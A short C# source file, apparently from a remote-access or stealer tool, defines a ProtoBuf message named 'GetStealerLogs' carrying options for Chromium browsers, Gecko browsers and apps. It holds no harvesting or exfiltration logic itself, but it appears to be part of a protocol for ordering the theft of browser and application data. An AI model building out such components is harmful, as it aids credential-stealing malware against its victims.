

using InvokedCommon.Structs;
using ProtoBuf;


namespace InvokedCommon.Messages
{
	[ProtoContract]
	public class GetStealerLogs : IMessage
	{
		[ProtoMember(1)]
		public ChromiumBrowserOptions chromiumBrowserOptions { get; set; }

		[ProtoMember(2)]
		public GeckoBrowserOptions geckoBrowserOptions { get; set; }

		[ProtoMember(3)]
		public AppsOptions appsOptions { get; set; }
	}
}
